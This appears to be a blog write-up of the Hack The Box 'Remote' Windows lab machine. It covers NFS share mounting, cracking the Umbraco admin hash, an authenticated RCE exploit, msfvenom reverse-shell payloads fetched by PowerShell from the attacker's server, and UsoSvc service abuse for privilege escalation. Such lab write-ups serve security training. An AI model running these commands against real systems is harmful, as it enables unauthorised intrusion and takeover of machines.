---
title: Remote
date: 2020-07-05
hero: /images/posts/hack-the-box/remote.png
categories:
- hack-the-box
tags:
- windows
- umbraco
- rpc
- mounting
- session jacking
---

# Remote

```
export IP=10.10.10.180
```

## Tools

* nmap
* python3
* rpcbind
* mount
* winPEAS

## Walkthrough

First things first, we need to do a `nmap` scan with the command `nmap -sS -sV -oA nmap/remote $IP`. Here are my results.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 01:28 EDT
Nmap scan report for 10.10.10.180
Host is up (0.056s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.97 seconds
```

Looks like there is a website being hosted on this box, so let's check that out. Well after poking around the website I found a login page that was linked to on the contact page.

Login Page
  - http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms
  - http://10.10.10.180/install

This link also tells us something about the website. They are using `unbraco` for their CMS. If we could find the version number maybe there is some sort of exploit.

After poking around the source of the login page, nothing stood out to me off the bat, so I am going to try and fuzz some directories. I am using `ffuf` to discover directories. I used the command `ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,.html,.json,.xml`. Interesting enough there is a directory called `install` that redirects you to the login page.

Let's try to enumerate the `/umbraco/` directory to see if we find anything interesting. Well the only thing I found that I could see was a path to `/umbraco/application` after investigating this there doesn't seem like much. I am going to try and research some of the other services running on the machine to maybe poke around in.

I am going to try scanning the `rpcbind` service with the command `nmap -sV --script=nfs-showmount 10.10.10.180` maybe there is some sort of file system that we can mount and view. Looks like there is a discoverable file system called `/site_backups`. Hmm this is interesting, maybe we can find credentials on that. Let's figure out how to access it. Okay so to mount the file system I used the command `sudo mount -t nfs 10.10.10.180:/site_backups /mnt`. Now we can see the contents of `/site_backups` in our `/mnt` folder. Let's do some exploring. After looking around it looks like this is a backup of the CMS `umbraco` so I did some googling and it looks like all the credentials are located in a database, so let's see if that was backed up or not. After some more searching I found [this](https://our.umbraco.com/forum/umbraco-7/using-umbraco-7/74780-how-do-i-check-what-db-umbraco-is-using) fourm post about the database location being in `Umbraco/AppData/umbraco.sdf`. So I used the command `find /mnt | grep -i '.sdf'` and found the file. When I try and `cat` it out it is a mess and since some of the data is binary I cannot `grep` it, but I can use the command `strings /mnt/App_Data/umbraco.sdf` to see just the ascii readable characters. Then I `grep` for 'admin' and noticed some hashes at the top. I went to `crackstation` and it turns out that the admin password is `baconandcheese`. If we try an login with the credentials `admin@htb.local::baconandcheese` we can get into the admin page.

```
Credentials:
  - Umbraco Admin
    admin@htb.local::baconandcheese
```

After poking around the admin panel for a little bit I didn't find anything too interesting to me, but I did find out that this host is running `Umbraco version 7.12.4`, and it turns out there is an authenticated (check) remote code execution exploit for this very version! What a coincidence! [Here](https://github.com/noraj/Umbraco-RCE) is the code now we just need to craft a reverse shell for the windows machine. I used the command `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f exe > reverse.exe` to create a reverse shell payload. Now we just need to get it on the target machine. We can start a server on our own machine using the command `python3 -c http.server`. Now we are hosting a server that our payload is on. When I use the command `python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command curl -UseBasicParsing -o C:\\Users\\Public\\Documents\\reverse.exe http://10.10.14.5:8000/Umbraco-RCE/reverse.exe'` I am getting a 200 code on my simple server, suggesting that the file has been downloaded, or at least accessed. We can check if we use the command `python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command Get-ChildItem -Path C:\\ -Filter reverse.exe -Recurse -ErrorAction SilentlyContinue -Force'`. This command will find the file on the system and should return the file and it's read/write permissions.

Now that we have our payload uploaded to the server we can start a listener on our machine using the command `nc -lvnp 1337` and run the command `python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command C:\\Users\\Public\\Documents\\reverse.exe'` to run the reverse shell on the machine. If we take a look at our listener we should see the shell pop up. If we take a look around we can find `user.txt` at the path `C:\Users\Public\user.txt`. You can read the file with the `type` command.

Time to look for some avenues for privilege escalation. The first thing I ran is `whoami /priv` and got the following.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled *
SeImpersonatePrivilege        Impersonate a client after authentication Enabled *
SeCreateGlobalPrivilege       Create global objects                     Enabled *
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I put stars near the permissions that stood out to me. The most interesting thing to me is `SeImpersonatePrivilege`. This sounds like I should be able to impersonate the `ns authority` user.

I did a `winPEAS` scan. Getting it to work on the machine was kinda tricky because something was wrong with the version I had. Anyways I got the binary from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe). Then I spawned a simple server on my machine and used the command `curl -o winPEASany.exe http://10.10.14.5:8000/winPEASany.exe`. Then I ran the program. You can see the output in `winPEAS/remote.txt`.

Okay so now I am running another check. I am using `PowerUp.ps1` to check the system. This was a bit hard to get working, but I found a good tutorial [here](https://recipeforroot.com/advanced-powerup-ps1-usage/). Make sure you follow it step by step, and I got it on the server in the usual way by using a simple python server. After running it it looks like the `UsoSvc` service is vulnerable, maybe I can craft another reverse shell payload and execute it as `ns authority`.

Okay here is how I did it, After discovering the `UsoSvc` I continued to read the `PowerUp` article and read that you can execute commands as a privileged user. For our instance we use the command `Invoke-ServiceAbuse -Name 'UsoSvc' -Command "[command_here]"`. If we upload another reverse shell to the server on another port then we can spawn a reverse shell as `ns authority`. I used the following command to craft a payload `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f exe > root_reverse.exe` then to get it on the server I created another simple server. Then open up a listener on port 1234. After the file is on the server run the shell using `Invoke-ServiceAbuse -Name 'UsoSvc' -Command "C:\Users\Public\root_reverse.exe"`. Then we can catch the shell and we are `ns authority`! The flag can be found on the admin's desktop. This was a pretty hard box for me. I am not that familiar with windows services, but I am glad I took on the challenge.
